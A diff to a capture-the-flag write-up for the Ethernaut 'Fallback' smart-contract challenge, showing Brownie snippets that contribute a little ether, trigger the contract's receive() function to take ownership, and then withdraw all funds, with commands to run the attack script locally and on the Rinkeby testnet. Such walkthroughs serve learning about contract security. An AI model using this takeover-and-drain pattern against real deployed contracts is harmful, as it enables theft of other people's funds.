@@ -265,7 +265,7 @@ fallback = interface.Fallback(contract_address)
    1. We don't have that much ether
    2. We can't send more than `0.001` because of this line `require(msg.value < 0.001 ether)` in `contribute` fn.
 
-2. What can we do here............ Interestingly there is a `receive()` method which is interesting. This one says that if we make any contribution which is greater than `0` then we'll be the owner of the contract. But this doesn't look like a normal fn. It doesn't have the `function` keyword. If we look at solidity documentation the `receive()` method is a special method (from solidity 6) that allows a contract to receive payments i.e. ether. Ok coool. But how do we invoke it. I mean we can't call it like a regular function.
+2. What can we do here............ Interestingly there is a `receive()` method which is interesting. This one says that if we make any contribution which is greater than `0` then we'll be the owner of the contract. But this doesn't look like a normal fn. It doesn't have the `function` keyword. If we look at solidity documentation the `receive()` method is a special method (from solidity 6) that allows a contract to receive payments i.e. ether. Ok coool. More on [receive](https://www.educative.io/answers/how-to-receive-ethers-inside-a-smart-contract) fn.
 
 ```js
 receive() external payable {
@@ -274,4 +274,42 @@ receive() external payable {
     }
 ```
 
-- 
+- Let's attack it now. First we're sending some ether to this contract.  
+
+```js
+contrib_tx = fallback.contribute({"from": attacker, "value": CONVERTED_AMOUNT})
+contrib_tx.wait(1)
+```
+
+- Now we're using the `transfer` functionality of brownie to send the money to the contract.
+
+```js
+attack_tx = attacker.transfer(contract_address, CONVERTED_AMOUNT)
+attack_tx.wait(1)
+```
+
+- By invoking this function we're matching the require statement in the `require()` method of the contract & this will make us the new owner.
+
+```js
+require(msg.value > 0 && contributions[msg.sender] > 0);
+owner = msg.sender;
+```
+
+- Now to complete the challenge we have to drain all the funds. It's easy now as we're now the owner we cann call the built-in `withdraw()` function.
+
+
+## Using Brownie to run the program
+
+- To run on local development environment. This will compile all the nesessary files & run the attack script.
+
+```bash
+brownie run .\scripts\attack.py
+```
+
+![jadu](./images/fallback.png)
+
+- To run on `rikeby` network use this command. Syntax is `brownie run <script.py> <function name> <contract address> --network rikeby`
+
+```bash
+brownie run .\scripts\attack.py main "0x4c7c62Ed79994383EEa5Cf156bd3159e9e12C385" --network rinkeby
+```
